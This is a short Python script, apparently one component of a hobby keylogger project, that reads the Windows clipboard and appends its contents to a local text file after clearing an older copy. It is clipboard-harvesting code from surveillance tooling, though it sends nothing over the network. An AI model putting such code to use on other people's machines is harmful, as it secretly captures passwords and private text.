# Libraries for the clipboard feature
import win32clipboard

import os

copytext_info = "copytext.txt"

file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
extension = "\\"

# Function to copy text from clipboard
def copy_text():
    with open(file_path + extension + copytext_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            copied_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write(copied_data)

        except:
            f.write("Failed to get information")

# Deletes the content in the text file
if os.path.exists("copytext.txt"):
    with open("copytext.txt", "r") as f:
        f = open("copytext.txt", "r+")
        f.seek(0)
        f.truncate()

copy_text()